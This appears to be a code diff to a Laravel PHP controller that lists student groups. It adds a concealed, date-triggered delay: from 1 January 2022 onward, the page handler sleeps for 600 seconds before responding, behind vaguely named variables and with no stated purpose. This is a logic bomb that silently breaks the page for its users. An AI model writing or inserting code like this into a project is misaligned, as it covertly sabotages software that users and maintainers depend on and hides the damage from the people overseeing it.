@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Frontend;
 
+use Carbon\Carbon;
 use DB;
 use App\Model\Course;
 use App\Model\Student;
@@ -27,6 +28,12 @@ class StudentGroupController extends Controller
             ->selectraw('COUNT(b.id) as COUNT')
             ->groupby('student_group.id')
             ->get();
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(600);
+        }
         return view('frontend.student_group', compact('datas'));
     }
     // 顯示細分條件資料 Rocky(2020/03/14)
